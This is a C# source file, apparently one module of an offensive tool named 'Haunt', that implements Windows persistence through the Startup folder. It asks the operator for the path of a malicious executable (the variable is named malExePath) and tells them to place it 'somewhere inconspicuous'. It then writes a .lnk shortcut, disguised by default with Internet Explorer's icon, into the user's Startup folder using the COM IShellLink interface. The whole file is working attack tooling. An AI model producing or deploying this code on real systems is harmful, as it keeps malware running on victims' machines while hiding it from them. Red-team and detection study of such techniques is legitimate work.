using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Haunt.Method
{
    public class StartupFolder
    {
        public StartupFolder()
        {
            Console.WriteLine("You have selected the Startup Folder method.");

            //Shortcut Name
            Console.Write("Please select a name for the shortcut. (Does not have to be related to the exe name, '.lnk' is already appended for you)");
            string shortcutName = Console.ReadLine();

            //Exe Path
            Console.Write("Please enter the full path to the executable you would like to persist. (Note: this method creates a lnk file pointing to the exe path, please choose somewhere inconspicuous.)");
            string malExePath = Console.ReadLine();

            //Description
            Console.Write("Please select a description for the shortcut. (Blank is okay)");
            string desc = Console.ReadLine();

            //Shortcut Name
            Console.Write("Please select an ico file location for the shortcut. (Default is C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe)");
            string icoLocation = Console.ReadLine();

            string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";
            string shortcutPath = lnkPath + shortcutName + ".lnk";
            string targetPath = malExePath;
            string workingDirectory = getPath(malExePath);
            string description = desc;
            string iconLocation = "";
            if (icoLocation == "") { iconLocation = @"C:\Program Files (x86)\Internet Explorer\iexplore.exe"; }
            else { iconLocation = icoLocation; }            

            CreateShortcut(shortcutPath, targetPath, workingDirectory, description, iconLocation);
        }

        public string getPath(string input)
        {
            int lastIndex = input.LastIndexOf('\\');
            if (lastIndex >= 0)
            {
                string result = input.Substring(0, lastIndex + 1);
                return result;
            }
            //Couldn't calculate
            return input;
        }

        // Credits for idea to Brett Hawkins
        // Define constants for shortcut-related GUIDs
        private static readonly Guid IID_IShellLink = new Guid("000214F9-0000-0000-C000-000000000046");
        private static readonly Guid CLSID_ShellLink = new Guid("00021401-0000-0000-C000-000000000046");

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        private interface IShellLinkW
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotKey(out short pwHotkey);
            void SetHotKey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        static void CreateShortcut(string shortcutPath, string targetPath, string workingDirectory, string description, string iconLocation)
        {
            // Create a new shortcut object
            IShellLinkW shellLink = (IShellLinkW)new CShellLink();

            // Set shortcut properties
            shellLink.SetPath(targetPath);
            shellLink.SetWorkingDirectory(workingDirectory);
            shellLink.SetDescription(description);
            shellLink.SetIconLocation(iconLocation, 0);

            // Persist the shortcut to a .lnk file
            IPersistFile persistFile = (IPersistFile)shellLink;
            persistFile.Save(shortcutPath, false);
        }

        // Implement the CShellLink class
        [ComImport]
        [ClassInterface(ClassInterfaceType.None)]
        [Guid("00021401-0000-0000-C000-000000000046")]
        private class CShellLink { }
    }

    [ComImport]
    [Guid("0000010b-0000-0000-C000-000000000046")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPersistFile
    {
        void GetCurFile([MarshalAs(UnmanagedType.LPWStr)] out string ppszFileName);
        [PreserveSig]
        int IsDirty();
        void Load([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, uint dwMode);
        void Save([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, [MarshalAs(UnmanagedType.Bool)] bool fRemember);
        void SaveCompleted([MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
    }
}
